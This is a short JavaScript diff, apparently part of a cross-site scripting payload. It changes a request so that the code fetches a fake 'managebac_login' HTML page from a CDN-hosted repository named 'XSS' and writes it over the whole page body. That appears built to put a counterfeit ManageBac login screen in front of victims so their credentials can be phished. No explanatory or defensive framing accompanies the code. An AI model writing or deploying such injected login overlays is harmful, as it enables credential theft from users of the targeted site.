@@ -42,7 +42,11 @@ const main = () => {
       typeof XMLHttpRequest != "undefined"
         ? new XMLHttpRequest()
         : new ActiveXObject("Microsoft.XMLHTTP");
-    xhr.open("get", "./managebac_login", true);
+    xhr.open(
+      "get",
+      "https://cdn.jsdelivr.net/gh/existencing/XSS/managebac_login.html",
+      true
+    );
     xhr.onreadystatechange = function () {
       if (xhr.readyState == 4 && xhr.status == 200) {
         document.body.innerHTML = xhr.responseText;
